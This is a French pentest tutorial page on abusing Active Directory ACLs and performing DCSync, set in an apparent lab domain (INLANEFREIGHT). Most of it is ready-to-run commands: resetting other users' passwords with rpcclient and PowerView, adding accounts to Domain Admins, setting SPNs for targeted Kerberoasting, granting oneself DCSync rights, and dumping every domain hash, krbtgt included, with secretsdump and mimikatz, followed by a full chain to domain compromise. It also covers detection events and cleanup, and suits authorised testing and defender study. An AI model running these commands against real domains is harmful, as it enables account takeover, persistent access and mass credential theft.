# Abus d'ACL et DCSync

Les Access Control Lists (ACL) definissent les permissions sur chaque objet AD. Une ACL mal configuree peut donner a un utilisateur standard le droit de modifier les mots de passe, d'ajouter des membres a des groupes privilegies, ou meme de repliquer l'annuaire (DCSync). BloodHound rend ces chemins visibles, mais il faut comprendre les ACL pour les exploiter.

## Pourquoi

Les ACL sont le mecanisme de permission le plus granulaire d'AD, et aussi le plus souvent mal configure. Un help desk qui a GenericAll sur un OU, un script de provisionnement qui a WriteDACL sur un groupe, une delegation oubliee : ces erreurs creent des chemins d'attaque invisibles lors d'un audit classique mais clairement visibles dans BloodHound.

## Comment ca marche

### Les ACE dangereux

| ACE (Access Control Entry) | Ce que ca permet |
|---|---|
| **GenericAll** | Controle total sur l'objet (reset password, modifier les membres, modifier les ACL) |
| **GenericWrite** | Ecrire sur n'importe quel attribut de l'objet |
| **WriteOwner** | Changer le proprietaire de l'objet (puis se donner GenericAll) |
| **WriteDACL** | Modifier les ACL de l'objet (puis se donner GenericAll) |
| **ForceChangePassword** | Changer le mot de passe sans connaitre l'ancien |
| **AddMembers** | Ajouter des membres a un groupe |
| **AllExtendedRights** | Inclut ForceChangePassword + droit de lire les mots de passe LAPS |

### Enumeration des ACL

{% tabs %}
{% tab title="BloodHound" %}
BloodHound detecte automatiquement les ACL exploitables. Les requetes utiles :

- **Find Shortest Paths to Domain Admins** : montre les chemins via les ACL
- **List All Kerberoastable Admins** : combine SPN + privileges
- L'edge "GenericAll", "WriteDACL", "WriteOwner" dans le graphe indique un chemin d'abus
{% endtab %}
{% tab title="PowerView" %}
```powershell
# - Enumerer les ACL d'un utilisateur specifique
Import-Module .\PowerView.ps1

# - Trouver les ACL interessantes pour un utilisateur
Find-InterestingDomainAcl -ResolveGUIDs |
    Where-Object {$_.IdentityReferenceName -eq "Help Desk"}

# - Voir les ACL sur un objet specifique
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}
```
{% endtab %}
{% endtabs %}

### Exploitation des ACL

{% tabs %}
{% tab title="ForceChangePassword" %}
```bash
# - Depuis Linux (Impacket)
# Changer le mot de passe d'un utilisateur cible
net rpc password '<TARGET_USER>' 'NewP@ssw0rd' \
    -U 'INLANEFREIGHT/<USER>%<PASSWORD>' -S <IP_DC>

# - Ou via rpcclient
rpcclient -U '<USER>%<PASSWORD>' <IP_DC>
rpcclient $> setuserinfo2 <TARGET_USER> 23 'NewP@ssw0rd'
```

```powershell
# - Depuis Windows
$SecPassword = ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $SecPassword
```
{% endtab %}
{% tab title="GenericAll sur un groupe" %}
```powershell
# - Ajouter notre utilisateur au groupe cible
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<USER>'

# - Verifier
Get-DomainGroupMember -Identity 'Domain Admins'
```

```bash
# - Depuis Linux
net rpc group addmem 'Domain Admins' '<USER>' \
    -U 'INLANEFREIGHT/<USER>%<PASSWORD>' -S <IP_DC>
```
{% endtab %}
{% tab title="GenericAll sur un utilisateur" %}
```powershell
# Option 1 : changer le mot de passe
Set-DomainUserPassword -Identity <TARGET> -AccountPassword $SecPassword

# Option 2 : configurer un SPN pour Kerberoasting cible
Set-DomainObject -Identity <TARGET> -Set @{serviceprincipalname='fake/spn'}
# Puis Kerberoast le compte

# Option 3 : desactiver la pre-authentification Kerberos pour ASREPRoast
Set-DomainObject -Identity <TARGET> \
    -XOR @{useraccountcontrol=4194304}
```
{% endtab %}
{% tab title="WriteDACL" %}
```powershell
# - Se donner les droits DCSync sur le domaine
Add-DomainObjectAcl -TargetIdentity "DC=INLANEFREIGHT,DC=LOCAL" \
    -PrincipalIdentity '<USER>' -Rights DCSync

# - Puis executer DCSync (voir section suivante)
```
{% endtab %}
{% endtabs %}

### DCSync

Le DCSync abuse du mecanisme de replication AD. Un utilisateur avec les droits `Replicating Directory Changes` et `Replicating Directory Changes All` peut simuler un Domain Controller et demander les hashes de tous les comptes du domaine, y compris krbtgt (Golden Ticket).

{% tabs %}
{% tab title="Linux" %}
```bash
# - DCSync avec secretsdump (Impacket)
secretsdump.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>'@<IP_DC>

# - Cibler un compte specifique
secretsdump.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>'@<IP_DC> \
    -just-dc-user Administrator

# - Extraire uniquement les hashes NTLM
secretsdump.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>'@<IP_DC> \
    -just-dc-ntlm
```
{% endtab %}
{% tab title="Windows" %}
```powershell
# - DCSync avec Mimikatz
.\mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator" exit

# - Extraire krbtgt (pour Golden Ticket)
.\mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt" exit
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Le DCSync est l'etape finale de la compromission AD. Avec le hash de krbtgt, on peut generer des Golden Tickets et maintenir un acces persistant au domaine. En pentest, documenter le chemin complet qui a mene au DCSync est aussi important que l'attaque elle-meme.
{% endhint %}

## En pratique

```bash
# Scenario : GenericAll sur un utilisateur DA via un groupe intermediaire

# 1 - BloodHound montre : <USER> -> GenericAll -> Help Desk -> GenericAll -> DA_USER

# 2 - Se donner GenericAll sur le groupe Help Desk (si WriteDACL)
# 3 - S'ajouter au groupe Help Desk
net rpc group addmem 'Help Desk' '<USER>' \
    -U 'INLANEFREIGHT/<USER>%<PASSWORD>' -S <IP_DC>

# 4 - Changer le mot de passe du DA
rpcclient -U '<USER>%<PASSWORD>' <IP_DC>
rpcclient $> setuserinfo2 DA_USER 23 'NewP@ssw0rd!'

# 5 - DCSync avec le compte DA
secretsdump.py INLANEFREIGHT.LOCAL/DA_USER:'NewP@ssw0rd!'@<IP_DC>
```

## Pieges et galeres

- **ACL heritees** : une ACL sur une OU se propage a tous les objets en dessous. Verifier la source de l'ACL (directe ou heritee) pour comprendre la portee reelle
- **Changement de mot de passe et verrouillage** : changer le mot de passe d'un compte de production peut casser des services. En pentest, preferer le Kerberoasting cible (ajouter un SPN) plutot que le reset de mot de passe
- **DCSync et detection** : le DCSync genere des events 4662 avec les GUID de replication. Un SOC mature detectera cette activite. C'est une technique bruyante
- **Nettoyage** : apres exploitation, retirer les modifications d'ACL et de groupes pour ne pas laisser de backdoors dans l'environnement du client

## Retour terrain

L'abus d'ACL est le chemin d'attaque le plus courant dans les rapports de pentest AD. Les organisations accumulent des delegations au fil des annees sans jamais les nettoyer. BloodHound revele systematiquement des chemins que les equipes IT ignoraient. Le combo "GenericAll d'un groupe de support sur les comptes de service" est un classique. Le DCSync est la recompense finale : avec le hash de krbtgt et celui de l'administrateur, le domaine est entierement compromis.

## Memo express

| ACE | Exploitation | Outil |
|---|---|---|
| ForceChangePassword | Reset du mot de passe | rpcclient, PowerView |
| GenericAll (groupe) | S'ajouter au groupe | net rpc, Add-DomainGroupMember |
| GenericAll (user) | Reset MDP / Targeted Kerberoast | PowerView |
| WriteDACL | Se donner DCSync | Add-DomainObjectAcl |
| WriteOwner | Devenir proprietaire puis GenericAll | Set-DomainObjectOwner |
| DCSync | Dump tous les hashes | secretsdump.py, mimikatz |

***
